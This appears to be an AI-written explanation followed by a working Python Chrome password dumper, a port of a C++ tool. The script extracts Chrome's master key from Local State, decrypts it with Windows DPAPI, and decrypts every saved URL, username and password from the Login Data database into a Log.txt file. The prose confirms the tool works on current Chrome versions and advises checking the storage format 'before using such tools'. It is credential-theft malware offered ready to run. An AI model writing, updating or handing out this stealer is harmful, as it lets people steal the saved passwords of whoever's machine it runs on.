"""
The Chrome password dumper in Main.cpp uses the standard technique of extracting the master key from Chrome’s Local State file, decrypting it with Windows DPAPI, and then using it to decrypt passwords from the Login Data SQLite database. This approach has worked for Chrome versions 80 and newer (released in 2020) up to recent versions, because Chrome still stores passwords using AES encryption with a master key in the same files.

However, there are caveats:

Chrome sometimes updates the way it stores secrets or encrypts data. As of September 2025, this approach still generally works, but minor changes in Chrome’s file format, table schema, or encryption header can break compatibility.
The dumper expects the SQLite schema and the encrypted key format to be unchanged. If Chrome changes how the key is stored or the database schema, the program may need adjustments.
Chrome’s default profile path can be different if the user has multiple profiles or uses a non-default installation location.
Summary:
Yes, the dumper works with the latest Chrome versions as long as the file format and encryption scheme remain unchanged. If Google changes the password storage or encryption, the code may require updates. Always check the current Chrome storage format before using such tools```"""
import os
import base64
import shutil
import sqlite3
import json
import win32crypt
from Crypto.Cipher import AES

LOCAL_STATE_PATH = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Local State')
LOGIN_DATA_PATH = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data')
TMP_DB_PATH = 'Tmp.db'
LOG_FILE = 'Log.txt'

def get_master_key(local_state_path):
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    encrypted_key_b64 = local_state['os_crypt']['encrypted_key']
    encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  # Remove 'DPAPI' prefix
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

def decrypt_password(ciphertext, master_key):
    if ciphertext.startswith(b'v10'):
        ciphertext = ciphertext[3:]
        iv = ciphertext[:12]
        payload = ciphertext[12:-16]
        tag = ciphertext[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt_and_verify(payload, tag)
        return decrypted_pass.decode()
    else:
        # Old-style DPAPI directly
        try:
            return win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1].decode()
        except Exception:
            return ""
        
def main():
    if not os.path.exists(LOCAL_STATE_PATH) or not os.path.exists(LOGIN_DATA_PATH):
        print("Chrome files not found.")
        return

    master_key = get_master_key(LOCAL_STATE_PATH)
    shutil.copy2(LOGIN_DATA_PATH, TMP_DB_PATH)

    conn = sqlite3.connect(TMP_DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')

    with open(LOG_FILE, 'w', encoding='utf-8') as log:
        for url, username, password in cursor.fetchall():
            decrypted = decrypt_password(password, master_key)
            log.write(f"Url: {url}\nUsername: {username}\nPassword: {decrypted}\n\n")
            print(f"Url: {url}\nUsername: {username}\nPassword: {decrypted}\n")

    cursor.close()
    conn.close()
    os.remove(TMP_DB_PATH)

if __name__ == "__main__":
    main()
Highlights
Master Key Extraction: Reads and decrypts the Chrome master key from Local State.
Password Decryption: Decrypts each password from the copied SQLite database using AES-GCM if the format starts with v10. Falls back to DPAPI for older formats.
Database Access: Uses Python's sqlite3 to extract URLs, usernames, and password blobs from the Chrome database.
Output: Writes results to Log.txt (just as the C code does).
